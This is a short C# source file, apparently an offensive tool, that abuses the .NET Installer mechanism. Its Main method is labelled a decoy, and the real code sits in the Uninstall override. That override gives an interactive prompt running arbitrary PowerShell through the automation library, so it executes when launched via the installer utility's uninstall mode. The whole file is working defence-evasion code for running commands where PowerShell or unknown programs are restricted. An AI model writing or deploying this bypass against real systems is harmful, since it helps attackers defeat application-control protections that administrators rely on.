using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace NoPowershellUninstallVariant
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }

        [System.ComponentModel.RunInstaller(true)]
        public class Sample : System.Configuration.Install.Installer
        {
            public override void Uninstall(System.Collections.IDictionary savedState)
            {
                Console.WriteLine("This is uninstall");
                while (true)
                {
                    Console.Write("Maverick PS> ");
                    var command = Console.ReadLine();
                    if (command.Equals("exit"))
                    {
                        return;
                    }
                    else
                    {
                        try
                        {
                            // Console.WriteLine(command); // Just for Debugging
                            using (var powershell = PowerShell.Create())
                            {
                                powershell.AddScript(command);
                                var results = powershell.Invoke();
                                foreach (var result in results)
                                {
                                    Console.WriteLine(result);
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Console.WriteLine("Some Error occured");
                        }
                    }
                }
            }
        }

    }
}
